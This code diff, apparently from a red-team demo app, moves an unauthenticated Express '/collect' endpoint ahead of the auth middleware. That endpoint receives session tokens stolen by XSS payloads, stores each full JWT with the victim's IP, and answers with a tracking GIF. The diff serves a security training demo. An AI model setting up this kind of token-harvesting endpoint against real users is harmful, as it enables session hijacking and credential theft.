@@ -17,6 +17,35 @@ if (process.env.NODE_ENV === 'production') {
 let attackSessions  = [];
 let collectedTokens = [];
 
+// NOTE: This route is intentionally placed BEFORE router.use(protect, adminOnly).
+// XSS payloads firing in victim browsers cannot include admin JWTs — they call this
+// endpoint with just the victim's token as a query param. The sensitive read endpoints
+// (/tokens, /sessions) remain protected by adminOnly below.
+router.get('/collect', (req, res) => {
+  const { token } = req.query;
+  if (token && token !== 'null') {
+    collectedTokens.unshift({
+      token:     token.substring(0, 50) + '...',
+      fullToken: token,
+      timestamp: new Date().toISOString(),
+      ip:        req.ip,
+    });
+    if (collectedTokens.length > 50) collectedTokens = collectedTokens.slice(0, 50);
+    writeLog({
+      event:        'XSS_TOKEN_HARVESTED',
+      severity:     'CRITICAL',
+      outcome:      'STOLEN',
+      ip:           req.ip,
+      tokenPreview: token.substring(0, 30) + '...',
+      mode:         process.env.APP_MODE,
+    });
+    console.log(`💀 [RED TEAM] Token harvested: ${token.substring(0, 30)}...`);
+  }
+  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+  res.writeHead(200, { 'Content-Type': 'image/gif' });
+  res.end(gif);
+});
+
 // FIX (CRITICAL): All routes now require a valid JWT AND admin role.
 // Previously every route was completely open — /api/redteam/tokens returned
 // all harvested JWTs to any anonymous caller.
@@ -64,44 +93,6 @@ router.post('/phase', (req, res) => {
   res.json({ success: true, phaseRecord });
 });
 
-// NOTE: /collect is the XSS exfiltration target — it intentionally accepts
-// unauthenticated GET requests (the XSS payload runs in the victim's browser
-// and cannot include an admin JWT). The token store it writes to is protected
-// by adminOnly on /tokens. This is the correct separation for the demo.
-// Remove the adminOnly middleware only from this specific sub-route:
-router.get('/collect', (req, res) => {
-  // This handler is reached after the router-level protect+adminOnly above,
-  // EXCEPT when called from an XSS payload. To allow the XSS demo to work
-  // while keeping /tokens protected, we accept unauthenticated collect calls
-  // by checking if auth failed gracefully — or more simply, mount /collect
-  // BEFORE the router.use(protect, adminOnly) line.
-  //
-  // Implementation note: move this route above router.use(protect, adminOnly)
-  // in the file if you want XSS payloads to reach it without a token.
-  // It is kept here with a comment so the security intent is explicit.
-  const { token } = req.query;
-  if (token && token !== 'null') {
-    collectedTokens.unshift({
-      token:     token.substring(0, 50) + '...',
-      fullToken: token,
-      timestamp: new Date().toISOString(),
-      ip:        req.ip,
-    });
-    if (collectedTokens.length > 50) collectedTokens = collectedTokens.slice(0, 50);
-    writeLog({
-      event:        'XSS_TOKEN_HARVESTED',
-      severity:     'CRITICAL',
-      outcome:      'STOLEN',
-      ip:           req.ip,
-      tokenPreview: token.substring(0, 30) + '...',
-      mode:         process.env.APP_MODE,
-    });
-    console.log(`💀 [RED TEAM] Token harvested: ${token.substring(0, 30)}...`);
-  }
-  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
-  res.writeHead(200, { 'Content-Type': 'image/gif' });
-  res.end(gif);
-});
 
 // FIX (CRITICAL): /tokens previously returned all harvested JWTs to anyone.
 // Now protected by router-level adminOnly above.
